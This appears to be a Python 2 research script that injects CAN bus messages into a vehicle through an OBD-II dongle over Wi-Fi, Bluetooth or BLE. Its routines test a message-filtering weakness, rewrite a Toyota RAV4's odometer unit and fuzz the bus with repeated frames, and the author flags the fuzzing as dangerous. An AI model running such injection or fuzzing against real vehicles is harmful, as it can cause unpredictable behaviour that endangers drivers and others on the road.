import time
from settings import *
from bluetooth import *
import pyble
from OBDPeripheral import MyPeripheral

# query dongle configuration with dongle index
dongle = 1
dongle_config = get_config(dongle)


# Parameters:
# mode: 0-Wi-Fi, 1-Bluetooth, 2-BLE
# client_socket: connection instance (peripheral in BLE)
# message: data to be sent
# interval: waiting time limit between write and read operations
def inject_message(mode, client_socket, message, interval=0.5):
    if mode == 0:
        # Wi-Fi
        client_socket.send(b"%s\r" % message)
        time.sleep(interval)
        data = client_socket.recv(1024)
        print('Received: ', repr(data))
    elif mode == 1:
        # Bluetooth
        client_socket.send(b"%s\r" % message)
        time.sleep(interval)
        data = client_socket.recv(1024)
        print('Received: ', repr(data))
    else:
        # BLE
        BLE_write_with_response(client_socket, message, interval)  # client_socket is a peripheral instance


# Write value to a BLE peripheral and read response
def BLE_write_with_response(peripheral, value, interval):
    v = bytearray(b"%s\r" % value)
    peripheral.writeValueForCharacteristic(v, c_write.instance, True)
    time.sleep(interval)
    peripheral.readValueForCharacteristic(c_read.instance)


# Interactive shell for CAN message testing
def test_input(mode, client_socket):
    while True:
        _input = raw_input("Sending input:")
        if _input.__len__() == 0:
            return
        inject_message(mode, client_socket, _input)


# Dongle initialization
def dongle_init(mode, client_socket):
    #     cmd_set = ['ATE0', 'ATRV', 'ATE1', 'ATH1', 'AT SP 6', 'AT CAF1']
    cmd_set = ["ATZ", "ATH1", "AT SP 6"]
    for cmd in cmd_set:
        inject_message(mode, client_socket, cmd)
        # time.sleep(1)
    print "Dongle init finish"
    print


# Test for message filtering vulnerability
def filter_test(mode, client_socket):
    cmd_set = ["ATZ", "ATH1", "AT SP 6", "AT SH 191", "04 00 00", "02 00 00", "00 00 00", "01 00 00", "03 00 00", "05 00 00", "07 00 00", "08 00 00", "09 01 00", "10 00 01"]
    for cmd in cmd_set:
        inject_message(mode, client_socket, cmd)
        # time.sleep(1)
    print "Filter test finish"
    print


# Converting odometer unit to KM/L, for Toyota RAV4
def To_KM_L(mode, client_socket):
    cmd_set = ['ATCRA 7C8', 'ATFCSH 7C0', '3E1', 'ATE0', '3BA280']
    for cmd in cmd_set:
        inject_message(mode, client_socket, cmd)
    print "To KM_L finish"
    print


# Converting odometer unit to MPG, for Toyota RAV4
def To_MPG(mode, client_socket):
    cmd_set = ['ATE0', 'ATRV', 'ATCRA 7C8', 'ATFCSH 7C0', '3E1', 'ATE0', '3BA240']
    for cmd in cmd_set:
        inject_message(mode, client_socket, cmd)
    print "To KM_L finish"
    print


# Read VIN with PID
def read_VIN(mode, client_socket):
    cmd_set = ["ATD", "ATE0", "AT AT 0", "ATS0", "ATH0", "ATCAF 1", "AT ST 96", "AT SP 7", "09 02"]
    for cmd in cmd_set:
        inject_message(mode, client_socket, cmd)
    print "Read VIN finish"
    print


# Fuzzing test
# !!! Dangerous, since this will cause unpredicted consequence to the vehicle
def fuzz(mode, client_socket):
    header_cmd = "AT SH 191"
    inject_message(mode, client_socket, header_cmd)

    # set message id finish
    # start fuzzing

    fuzz_cmd = "04 00 00" # fuzzing message
    fuzz_speed = 0.02  # fuzzing speed in seconds
    for i in range(1000):
        inject_message(mode, client_socket, fuzz_cmd, 0)
        time.sleep(fuzz_speed)


# Main
if dongle_config.mode == 0:
    # Wi-Fi
    HOST = dongle_config.address          # Standard loopback interface address (localhost)
    PORT = dongle_config.port        # Port to listen on (non-privileged ports are > 1023)
    print "Connection: ip=%s, port=%d" % (HOST, PORT)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # TODO WIFI, perform CAN bus message injection
    dongle_init(0, s)
    # To_MPG(0, s)
    # read_VIN(0, s)
    # filter_test(0, s)


elif dongle_config.mode == 1:
    # Classic Bluetooth
    print "Scanning nearby devices..."
    devices = discover_devices(lookup_names=True)

    for addr, name in devices:
        print "%s - %s" % (addr, name)
        if name.strip() == dongle_config.name:
            dongle_config.address = addr

        if dongle_config.address != "":
            client_socket = BluetoothSocket(RFCOMM)
            service_matches = find_service(address=addr)
            print service_matches

            client_socket.connect((dongle_config.address, dongle_config.port))

            # TODO Bluetooth, perform CAN bus message injection
            dongle_init(1, client_socket)
            # test_input(1, client_socket)
            # read_VIN(1, client_socket)
            # filter_test(1, client_socket)

            client_socket.close()

        else:
            print "[!] Device name %s not found!" % dongle_config.name
else:
    # Bluetooth LE
    cm = pyble.CentralManager()
    if cm.ready:
        target = None
        device_list = []
        p = None
        scan_interval = 50  # number of scans
        for i in range(scan_interval):
            try:
                target = cm.startScan()
                if target:
                    if target not in device_list:
                        device_list.append(target)
                    if str(target).__contains__(dongle_config.name):
                        print "Target dongle %s found, connecting to it..." % dongle_config.name
                        p = cm.connectPeripheral(target)
                        break

            except Exception as e:
                print e

        if p is None:
            for d in device_list:
                print d
            print "Target Dongle %s not found." % dongle_config.name
        else:
            target.delegate = MyPeripheral
            for service in p:
                print service
                for characteristic in service:
                    print characteristic, " : ",
                    print characteristic.value

            # get corresponding read/write uuids
            if dongle_config.uuid != "":
                service_uuid = dongle_config.uuid.keys()[0]
                read_uuid = dongle_config.uuid.get(service_uuid)[0]
                write_uuid = dongle_config.uuid.get(service_uuid)[1]
                c_write = p[service_uuid][write_uuid]
                c_read = p[service_uuid][read_uuid]

            else:
                c_write = ""
                c_read = ""

            p.setNotifyForCharacteristic(True, c_read.instance)

            # TODO BLE, perform CAN bus message injection
            dongle_init(2, p)
            # test_input(2, p)
            # read_VIN(2, p)
            # fuzz(2, p)
            # filter_test(2, p)
            cm.disconnectPeripheral(p)

